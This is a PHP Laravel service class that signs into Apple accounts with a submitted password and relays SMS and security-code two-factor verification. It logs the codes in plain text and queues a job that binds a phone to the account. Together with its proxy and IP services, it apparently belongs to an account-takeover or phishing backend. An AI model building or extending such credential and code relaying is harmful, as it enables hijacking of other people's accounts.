<?php

namespace Modules\AppleClient\Service;


use App\Apple\PhoneNumber\PhoneNumberFactory;
use App\Events\AccountAuthFailEvent;
use App\Events\AccountAuthSuccessEvent;
use App\Events\AccountLoginSuccessEvent;
use App\Jobs\BindAccountPhone;
use App\Models\SecuritySetting;
use Carbon\Carbon;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use libphonenumber\NumberParseException;
use libphonenumber\PhoneNumberFormat;
use Modules\AppleClient\Service\DataConstruct\Phone;
use Modules\AppleClient\Service\Exception\VerificationCodeException;
use Modules\AppleClient\Service\Response\Response;
use Modules\IpAddress\Service\IpService;
use Modules\IpProxyManager\Service\ProxyService;
use Saloon\Exceptions\Request\RequestException;

class IndexControllerService
{


    public function __construct(
        protected readonly AppleClientService $appleClientService,
        protected readonly PhoneNumberFactory $phoneNumberFactory,
        protected readonly IpService          $ipService,
        protected readonly ProxyService       $proxyService,
    )
    {

    }

    public function getGuid(): string
    {
        return $this->appleClientService->getGuid();
    }

    protected function validateAccount(string $accountName): string
    {
        $validator = Validator::make(['email' => $accountName], [
            'email' => 'email',
        ]);

        // 不是有效的邮箱,那就是手机号
        if ($validator->fails() && !Str::startsWith('+',$accountName)) {
            $accountName = $this->formatPhone($accountName);
        }

        return $accountName;
    }

    protected function dispatchBindAccountPhone(): void
    {
        BindAccountPhone::dispatch($this->appleClientService->getAccount()->id,$this->getGuid())
            ->delay(Carbon::now()->addSeconds(5));

    }

    /**
     * @param string $accountName
     * @param string $password
     * @return Response
     * @throws Exception\UnauthorizedException
     * @throws \JsonException
     */
    public function verifyAccount(string $accountName,string $password): Response
    {
        $accountName = $this->validateAccount($accountName);

        $response = $this->appleClientService->sign($accountName,$password);

        $account = $this->appleClientService->getAccountByCache();

        Event::dispatch(new AccountLoginSuccessEvent(account: $account,description: "登录成功"));

        return $response;
    }

    public function getPhoneLists(): Collection
    {
        return $this->appleClientService->getPhoneLists();
    }
    public function getTrustedPhoneNumber(): ?Phone
    {
        return $this->appleClientService->getTrustedPhoneNumber();
    }

    protected function getCountryCode():?string
    {
        return SecuritySetting::first()?->configuration['country_code'] ?? null;
    }

    protected function formatPhone(string $phone): string
    {
        if (empty($countryCode = $this->getCountryCode())) {
            return $phone;
        }

        try {

            return $this->phoneNumberFactory->createPhoneNumberService(
                $phone,
                $countryCode,
                PhoneNumberFormat::INTERNATIONAL
            )->format();

        } catch (NumberParseException $e) {
            return $phone;
        }
    }

    public function sendSms(int $id)
    {
        return $this->appleClientService->sendPhoneSecurityCode($id);
    }

    public function sendSecurityCode()
    {
        return $this->appleClientService->sendSecurityCode();
    }

    /**
     * @param string $id
     * @param string $code
     * @return bool|Response
     * @throws Exception\StolenDeviceProtectionException
     * @throws Exception\UnauthorizedException
     * @throws RequestException
     * @throws VerificationCodeException
     * @throws \JsonException
     * @throws \Saloon\Exceptions\Request\FatalRequestException
     */
    public function verifyPhoneCode(string $id,string $code): bool|Response
    {

        $account = $this->appleClientService->getAccountByCache();

        try {

            $response = $this->appleClientService->verifyPhoneCode($id,$code);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "手机验证码验证成功 code:{$code}"));

        } catch (RequestException $e) {

            Event::dispatch(new AccountAuthFailEvent(account: $account,description: $e->getMessage()));
            throw $e;
        }

        $this->dispatchBindAccountPhone();

        return $response;
    }

    /**
     * @param string $code
     * @return bool|Response
     * @throws Exception\StolenDeviceProtectionException
     * @throws Exception\UnauthorizedException
     * @throws RequestException
     * @throws VerificationCodeException
     * @throws \JsonException
     * @throws \Saloon\Exceptions\Request\FatalRequestException
     */
    public function verifySecurityCode(string $code): bool|Response
    {
        $account = $this->appleClientService->getAccountByCache();
        try {


            $response = $this->appleClientService->verifySecurityCode($code);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "安全码验证成功 code:{$code}"));

        } catch (RequestException $e) {

            Event::dispatch(new AccountAuthFailEvent(account: $account,description: $e->getMessage()));
            throw $e;
        }

        $this->dispatchBindAccountPhone();

        return $response;
    }
}

